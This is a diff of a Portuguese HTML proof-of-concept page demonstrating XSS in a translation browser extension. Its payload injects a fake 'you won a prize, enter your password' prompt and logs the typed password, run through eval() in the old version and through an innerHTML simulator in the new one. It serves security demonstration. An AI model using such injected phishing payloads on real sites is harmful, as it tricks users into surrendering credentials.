@@ -1,38 +1,41 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <title>Prova de Conceito XSS em Extensão do Tradutor</title>
+  <meta charset="UTF-8">
+  <title>PoC XSS em extensão de tradução</title>
 </head>
 <body>
-  <h1>Teste de Segurança - Extensão Google Tradutor</h1>
+  <h1>Exemplo de vulnerabilidade em extensões</h1>
 
-  <p id="demo" title='
+  <p>
+    Abaixo está um texto aparentemente inofensivo:
+  </p>
+
+  <div id="texto-traduzivel">
     &lt;script&gt;
       let p = document.createElement("p");
       p.innerHTML = `
-        &lt;div style="background:black;color:lime;font-size:18px;padding:10px;margin-top:10px;"&gt;
-          🔒 VOCÊ GANHOU MIL REAIS, ENTRE COM SUA SENHA PARA RESGATAR:
+        &lt;div style="background:black;color:lime;font-size:18px;padding:10px;"&gt;
+          VOCÊ GANHOU MIL REAIS, ENTRE COM SUA SENHA:
         &lt;/div&gt;
-        &lt;input id="fake-pass" type="password" placeholder="SENHA AQUI" style="padding:5px;margin-top:5px;"&gt;
+        &lt;input type="password" id="fake-pass" placeholder="Digite sua senha"&gt;
       `;
       document.body.appendChild(p);
       document.getElementById("fake-pass").addEventListener("keydown", function(e) {
-        if(e.key === "Enter"){
+        if (e.key === "Enter") {
           console.log("Senha digitada:", this.value);
         }
       });
     &lt;/script&gt;
-  '>Passe o mouse aqui para ver um exemplo prático</p>
+  </div>
 
+  <!-- Simulador do comportamento de uma extensão vulnerável -->
   <script>
-    // Forçar execução do código do atributo title só pra demonstrar (não faça em produção)
-    const el = document.getElementById("demo");
-    const code = el.getAttribute("title");
-    const scriptMatch = code.match(/&lt;script&gt;([\s\S]*?)&lt;\/script&gt;/);
-    if (scriptMatch) {
-      eval(scriptMatch[1]);
-    }
+    const div = document.getElementById('texto-traduzivel');
+    // Simula uma extensão burra que pega o innerText, assume que é HTML e executa
+    const temp = document.createElement('div');
+    temp.innerHTML = div.innerText;
+    document.body.appendChild(temp);
   </script>
 </body>
 </html>
